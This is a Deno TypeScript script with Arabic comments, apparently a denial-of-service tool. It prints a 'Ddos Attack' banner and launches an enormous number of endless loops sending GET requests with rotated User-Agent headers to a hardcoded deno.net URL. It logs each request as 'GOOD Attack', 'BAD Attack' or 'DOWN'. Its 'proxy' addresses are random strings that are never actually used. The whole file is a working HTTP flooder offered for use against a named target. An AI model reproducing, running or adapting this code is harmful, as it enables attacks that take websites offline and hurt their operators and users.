// تأكد من تثبيت المكتبات التالية عبر Deno:
// deno.json يجب أن يحتوي على الأذونات التالية: net، read، write، run، و http

import { bold, green, red, yellow } from "https://deno.land/std@0.224.0/fmt/colors.ts";
import { Figlet } from "https://deno.land/x/figlet@v0.0.5/mod.ts";
import { randomInt } from "https://deno.land/std@0.224.0/math/mod.ts";

// دعم توليد User-Agent عشوائي
function generateUserAgent() {
  const agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (Linux; Android 10)...",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3)..."
  ];
  return agents[Math.floor(Math.random() * agents.length)];
}

// ألوان
const F = green;
const Z = red;
const S = yellow;
const B = bold;

// تأكيد تثبيت المكتبات (في Deno تكون عبر URL مباشرة)
console.log(F("[✓] جميع المكتبات مثبتة وجاهزة للاستخدام!"));

// الشعار
const fig = new Figlet();
const logo = await fig.write("Ddos Attack", "Slant");
console.log(logo);

const url = "https://ihhjjjh-x02rn86kw4ns.vvvvvhkj.deno.net/";

// دالة الهجوم عبر Proxy
async function ProxyAttack() {
  while (true) {
    const ip = Array.from({ length: 4 }, () => randomInt(0, 256)).join(".");
    const ports = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900];
    const port = ports[Math.floor(Math.random() * ports.length)];
    const proxy = `${ip}:${port}`;

    const headers = {
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-us,en;q=0.5",
      "Accept-Encoding": "gzip,deflate",
      "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
      "Keep-Alive": "115",
      "Connection": "keep-alive",
      "User-Agent": generateUserAgent()
    };

    try {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), 5000);
      const res = await fetch(url, {
        method: "GET",
        headers,
        signal: controller.signal
      });
      clearTimeout(id);

      if (res.ok) {
        console.log(F(`GOOD Attack: ${url} | ${proxy}`));
      } else {
        console.log(Z(`BAD Attack: ${url} | ${proxy}`));
      }
    } catch (_) {
      console.log(S(`DOWN: ${url} |`));
    }
  }
}

// دالة الهجوم العادي بدون Proxy
async function AttackMahos() {
  while (true) {
    const headers = {
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-us,en;q=0.5",
      "Accept-Encoding": "gzip,deflate",
      "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
      "Keep-Alive": "115",
      "Connection": "keep-alive",
      "User-Agent": generateUserAgent()
    };

    try {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), 5000);
      const res = await fetch(url, {
        method: "GET",
        headers,
        signal: controller.signal
      });
      clearTimeout(id);

      if (res.ok) {
        console.log(F(`GOOD Attack: ${url}`));
      } else {
        console.log(Z(`BAD Attack: ${url}`));
      }
    } catch (_) {
      console.log(S(`DOWN: ${url}`));
    }
  }
}

// إطلاق الهجمات (كما هو في الخيار 2 فقط)
async function linked() {
  const sg = '2'; // يمكن تغييرها لـ '1' لتجربة النوع الأول من الهجوم

  if (sg === '1') {
    for (let i = 0; i < 50000; i++) {
      AttackMahos();
    }
  } else if (sg === '2') {
    for (let i = 0; i < 500000000000; i++) {
      ProxyAttack();
    }
  }
}

linked();
